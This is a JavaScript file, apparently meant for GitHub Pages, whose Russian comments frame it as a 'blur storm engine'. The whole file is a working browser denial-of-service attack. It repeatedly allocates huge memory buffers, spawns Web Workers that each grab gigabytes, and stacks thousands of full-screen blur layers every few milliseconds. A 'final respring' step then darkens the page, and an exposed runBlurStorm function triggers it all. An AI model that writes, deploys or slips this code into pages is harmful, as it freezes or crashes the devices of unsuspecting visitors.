// blurstorm.js - Ultimate Blur Storm Engine
// Для GitHub Pages raw

const BlurStorm = {
    isRunning: false,
    layers: [],
    workerCount: 0,

    init: function() {
        if (this.isRunning) return;
        this.isRunning = true;
        
        console.log("%c[BLURSTORM] Engine initialized - Maximum pressure mode", "color: #ff00ff; font-size: 14px;");
        
        this.startMemoryPressure();
        this.startWorkerStorm();
        this.startBlurLayerStorm();
    },

    startMemoryPressure: function() {
        setInterval(() => {
            if (!this.isRunning) return;
            try {
                for (let i = 0; i < 12; i++) {
                    new ArrayBuffer(1024 * 1024 * 140);
                }
            } catch(e) {}
        }, 80);
    },

    startWorkerStorm: function() {
        setInterval(() => {
            if (!this.isRunning) return;
            try {
                const blob = new Blob([`
                    let buffers = [];
                    for(let i = 0; i < 420; i++) {
                        buffers.push(new ArrayBuffer(1024 * 1024 * 65));
                    }
                    setInterval(() => {
                        buffers.push(new ArrayBuffer(1024 * 1024 * 42));
                    }, 30);
                `]);
                new Worker(URL.createObjectURL(blob));
                this.workerCount++;
            } catch(e) {}
        }, 120);
    },

    startBlurLayerStorm: function() {
        let layerCount = 0;
        let intensity = 1;

        const stormInterval = setInterval(() => {
            if (!this.isRunning) {
                clearInterval(stormInterval);
                return;
            }

            // Увеличиваем количество слоёв каждую итерацию
            const layersThisTick = 35 + Math.floor(intensity * 8);
            
            for (let i = 0; i < layersThisTick; i++) {
                const layer = document.createElement('div');
                const blurValue = 12 + (layerCount % 140);
                
                layer.style.cssText = `
                    position: fixed;
                    inset: 0;
                    backdrop-filter: blur(${blurValue}px);
                    opacity: ${0.028 + (intensity * 0.012)};
                    z-index: 999999;
                    pointer-events: none;
                    mix-blend-mode: screen;
                `;
                
                document.body.appendChild(layer);
                this.layers.push(layer);
                layerCount++;
            }

            // Постепенно увеличиваем интенсивность
            if (layerCount % 800 === 0) {
                intensity = Math.min(intensity + 0.45, 4.2);
            }

            if (layerCount > 9999) {
                console.log(`%c[BLURSTORM] ${layerCount} blur layers active`, "color: #00ffff;");
            }

        }, 14); // Очень быстро — каждые 14мс
    },

    triggerFinalRespring: function() {
        document.body.style.transition = 'filter 1.8s ease-out';
        document.body.style.filter = 'blur(28px) brightness(0.25) contrast(1.6)';
        
        setTimeout(() => {
            document.body.style.filter = 'blur(12px) brightness(0.6)';
        }, 1400);
    }
};

// Автозапуск при вызове
window.runBlurStorm = function() {
    BlurStorm.init();
    
    // Финальный удар через 4.5 секунды
    setTimeout(() => {
        if (BlurStorm.isRunning) {
            BlurStorm.triggerFinalRespring();
        }
    }, 4500);
};
